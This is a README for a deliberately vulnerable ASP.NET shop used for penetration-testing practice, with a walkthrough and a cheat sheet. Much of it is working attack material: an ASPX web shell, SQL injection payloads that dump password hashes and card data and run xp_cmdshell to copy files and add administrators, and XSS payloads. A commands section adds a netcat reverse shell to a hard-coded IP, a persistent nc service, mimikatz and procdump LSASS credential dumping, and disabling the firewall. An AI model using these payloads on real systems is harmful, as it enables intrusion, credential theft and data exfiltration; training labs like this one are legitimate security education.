# MvcProductStore
A simple product store with many unsafe features used for PEN testing.
Based on the old Microsoft tutorial for MvcMusicStore found at https://docs.microsoft.com/en-us/aspnet/mvc/overview/older-versions/mvc-music-store/.

## Playbook

This is a walktrough of a path to discover the vulnerabilities of this web app.

### Recon
Start by browsing the website.
Check robots.txt.
Try to place an order in the shop and see what happens as a regular user. 
We notice the checkout flow want's us to create a user and we can later log in with that user. We can also create a user without shopping.
We notice a big search field in the top where we can search for products.
At the bottom of the page there is a link to a contact form where users can contact and upload files to customerservice.
On the frontpage there is also a review page where users can submit reviews.
Check the website for response headers and cookies, and see what information can be gathered here.


### Enumeration
We can run a free webscanner tool if available, eg. nikto, sparta or Owasp Zap. And see what vulnerabilities the scanner can find.


### Exploitation
Let's try to gain admin access to the web application. 
Try different logins to try and brute force. This is a slow process even using automated tools like Burp.

1. Create a new user on the [http://localhost:50881/Account/Register] Register page using firefox and open developer tools on the network tab. 
...Notice the POST parameters. 
...Notice the Role parameter which is empty. Try to enter Administrator to the user role, and resend. 
...We are now logged in as admin and has successfully escalated our priviledges! 

2. As an admin try to create a new product

3. Visit details for the Hugo Boss product, item number 1001.

4. Click the link 'View backup pdf'. Check the link url.

5. Using path traversal we can download the robots file:
	http://localhost:50881/StoreManager/Download?fileName=../robots.txt

	or better yet the web.config file using this link:
	http://localhost:50881/StoreManager/Download?fileName=../web.config 

6. From the web.config we learn the password of the admin user: bob@taxfree.com : password

7. Now login as Bob so all history will be on his account.

8. Go to reviews page and test XSS, <img src=x onerror=alert('XSS');> 

9. File Upload get shell
	Customer service page has upload functionality which saves files in Uploads folder. Could be exploited for 
	reverse shell upload. Seems like anything can be uploaded and directory browsing is enabled.

	If we can get access to the server it's easy to upload your own shell code and have the website execute it.

	Try creating a file called revshell.aspx with this content

	```

	<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<%= 
    Process.Start(new ProcessStartInfo("cmd","/c " + Request["c"])
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true
                    }).StandardOutput.ReadToEnd()    
    
    %>

	```

	Upload it to contact us page as attachment shell.aspx.

	Then type:
	http://localhost:50881/uploads/shell.aspx?c=dir

	Then try something like this:
	http://localhost:50881/Uploads/shell.aspx?c=copy%20%HOMESHARE%\Fakturaer\*.pdf%20C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads

	Then check content of Uploads directory.

	If the above fails then there is a Shell method in the StoreManager controller /StoreManager/Shell. Check it out. 
	Also another shell in the root /shell.aspx?c="COMMAND HERE". 
	

10. SQLi

	Examine how the search query is sent to the webshop.
	Try if you can inject some code in the search field using a '.

	Try curl and post to search page.

	> curl.exe http://localhost:50881/Store/Search  This will fail because only POST methods are supported
	> curl.exe -X POST http://localhost:50881/Store/Search --data 'q=hugo'  This also fails because we need a XSRF token.

	Try manually posting on the web page:
	
> Here are some examples that might get you started:
    ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
	x' UNION SELECT 99, @@version, 'http://foo.gif' --
    x' UNION SELECT 99, system_user, 'http://foo.gif' --
	x' UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
	x' UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
	x' UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)    
    
    x' UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT Email FROM AspNetUsers) AS C -- (get emails)
	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT PasswordHash FROM AspNetUsers) AS C -- (get PasswordHash)
	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT SecurityStamp FROM AspNetUsers) AS C -- (get SecurityStamp)

	Error based injection (will display server error)
	x' AND 1 IN (SELECT @@version) --
	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)

	Displays top email
	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --

	Displays emails for a given row numner
	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT Email FROM (SELECT ROW_NUMBER() OVER(ORDER BY OrderId) AS RoNum, OrderId, Email FROM Orders) AS tbl WHERE RoNum = 3) as varchar(4096))) --

	Displays top 1 credit card number
	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 'CardNo:' + LTRIM(RTRIM(CardNumber)) + '/expdate' + LTRIM(RTRIM(ExpDate)) + '/cvc' + LTRIM(RTRIM(CVC)) + '/' + LTRIM(RTRIM(CardHolderName)) FROM CreditCards) as varchar(4096))) --
		
	
	If xp_cmdshell is available try:
	x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\Documents\*.docx C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy'; -- (copies all doc files in folders and subfolders and overwrites if need be)
	
	*** Alternative way to get admin credentials
	x'; exec master..xp_cmdshell 'copy C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Web.config C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\webconfig.txt'; --

	Output is not shown as this is a blind injection.

	Alternatively you can redirect the output of the executed command to a database table and read the contents of the table through SQL injection!
	You can create a table and store the output of a command to it with the following:
	
	Example: create new table and dump contents of c drive to table
	x'; create table hacker (id int identity(1,1), output nvarchar(255) null); --
	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:\'; --		
	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir C:\Users\jrn\Desktop'; --			
	x' union select 99, output, 'http://foo.gif' from hacker where output is not null --
	x'; drop table hacker --

	Or combine this with the file upload vulnerability (see next section).
	
	This prints the contents of local folder to dir_out.txt file
	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir ..\..\..\..\ /p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --

	More fun with powershell. See what services are running on the server:
	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\services.txt';EXEC master..xp_cmdshell @cmd; --
	





## Cheat sheet

### Authorisation
An admin has left a hint on the login page. See if you can find it in the source code for the page. Can you figure out the email address? Probably the domain has something to do with the site.
Password hint: password
Another way to get in as admin is to create a regular user. Check the Register page source code for hints, and examine what is being posted back to the server. Maybe you can escalate yourself as admin by fiddling with the POST values?

### CSRF
Antiforgery tokens are enabled in this ASP.NET 5 MVC application.

### Debug mode
Debug mode in web.config is off.

### Cookies
HttpOnly cookies are enabled by default in ASP.NET session cookies.
Sliding cookie expiration is enabled.

### Headers
ASP.NET suffors from chattiness of headers.
CSP headers are not enabled.

### SSL
Https redirection is not enabled

### External javascript libraries
There are no vulnerable third party libraries

### Brute force login
Login page does not protect from multiple login attempts with same username/email.

### Directory browsing
Enabled through web.config.

### Path Traversal
The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. 


### XSS
Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance.
On the front page is a box for user reviews. It seems you can paste almost anything in the textbox!

Things to try https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection:
          
           Basic payload
            <script>alert('XSS')</script>
            <scr<script>ipt>alert('XSS')</scr<script>ipt>
            "><script>alert('XSS')</script>
            "><script>alert(String.fromCharCode(88,83,83))</script>
                    
           Img payload
            <img src=x onerror=alert('XSS');>
            <img src=x onerror=alert('XSS')//
            <img src=x onerror=alert(String.fromCharCode(88,83,83));>
            <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
            <img src=x:alert(alt) onerror=eval(src) alt=xss>
            "><img src=x onerror=alert('XSS');>
            "><img src=x onerror=alert(String.fromCharCode(88,83,83));>

### SQL injection
Try if you can inject some code in the search field.
Here are some examples that might get you started:
    ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
	x' UNION SELECT 99, @@version, 'http://foo.gif' --
    x' UNION SELECT 99, system_user, 'http://foo.gif' --
	x' UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
	x' UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
	x' UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)    
    
    x' UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT Email FROM AspNetUsers) AS C -- (get emails)
	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT PasswordHash FROM AspNetUsers) AS C -- (get PasswordHash)
	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT SecurityStamp FROM AspNetUsers) AS C -- (get SecurityStamp)

	Error based injection (will display server error)
	x' AND 1 IN (SELECT @@version) --
	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)
	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --
	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 'CardNo:' + LTRIM(RTRIM(CardNumber)) + '/expdate' + LTRIM(RTRIM(ExpDate)) + '/cvc' + LTRIM(RTRIM(CVC)) + '/' + LTRIM(RTRIM(CardHolderName)) FROM CreditCards) as varchar(4096))) --

	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT Email FROM (SELECT ROW_NUMBER() OVER(ORDER BY OrderId) AS RoNum, OrderId, Email FROM Orders) AS tbl WHERE RoNum = 3) as varchar(4096))) --

	

	If xp_cmdshell is not available try:

	EXEC sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;

	Then try this	
	x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\*.doc C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy'; -- (copies all doc files in folders and subfolders and overwrites if need be)

	Output is not shown as this is a blind injection.

	x'; exec master..xp_cmdshell 'whoami.exe'; -- (current username)
	x'; exec master..xp_cmdshell 'cd'; -- (print working directory)

	Add administrator
	exec master..xp_cmdshell 'net user foobar Password123 /add'; -- 
	exec master..xp_cmdshell 'net localgroups "Administrators" /add'; --

	The above command adds a new local administrator to the remote server. That might help. 
	Alternatively you can redirect the output of the executed command to a database table and read the contents of the table through SQL injection!
	You can create a table and store the output of a command to it with the following:

	; create table #output (id int identity(1,1), output nvarchar(255) null);
	; insert #output (output) exec @rc = master..xp_cmdshell 'dir c:\';
	; select * from #output where output is not null order by id;

	Example create new table and dump contents of c drive to table
	x'; create table hacker (id int identity(1,1), output nvarchar(255) null); --
	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:\'; --		
	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir C:\Users\jrn\Desktop'; --			
	x' union select 99, output, 'http://foo.gif' from hacker where output is not null --
	x'; drop table hacker --

	Or combine this with the file upload vulnerability (see next section).
	
	This prints the contents of local folder to dir_out.txt file
	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir ..\..\..\..\ /p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --

	More fun with powershell. See what services are running on the server:
	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
	

### File Upload
Customer service page has upload functionality which saves files in Uploads folder. Could be exploited for 
reverse shell upload. Seems like anything can be uploaded and directory browsing is enabled.

If we can get access to the server it's easy to upload your own shell code and have the website execute it.

Try creating a file called shell.aspx with this content

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<%= 
    Process.Start(new ProcessStartInfo("cmd","/c " + Request["c"])
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true
                    }).StandardOutput.ReadToEnd()    
    
    %>
	
	Upload it to contact us page as attachment shell.aspx.

Then type 
http://localhost:50881/Uploads/shell.aspx?copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads

Then check content of Uploads directory.

If the above fails then there is a Shell method in the StoreManager controller /StoreManager/Shell. Check it out. 
Also another shell in the root /shell.aspx?c="COMMAND HERE". 



#### Usefull commands:
net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

#### Turn off firewall
netsh firewall set opmode disable 

#### Add new user
net user test 1234 /add
net localgroup administrators test /add

#### Mimikatz
git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full


### More stuff
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/


## Git

### Initial setup

```
cd into 'MvcProductStore' dir
git init                    # initialize directory
git add . -A                # add all files from current and subdirectories
git commit -m "msg"         # commit changes to local repo
git remote add origin <url> # add remote repo
git remote -v               # check repo names
git pull origin master --allow-unrelated-histories  # get latest from remote repo
git push origin master  # push changes to remote repo

```

### Clone

```
cd into 'MvcProductStore' dir
git clone <remote>          # clone remote repo

```
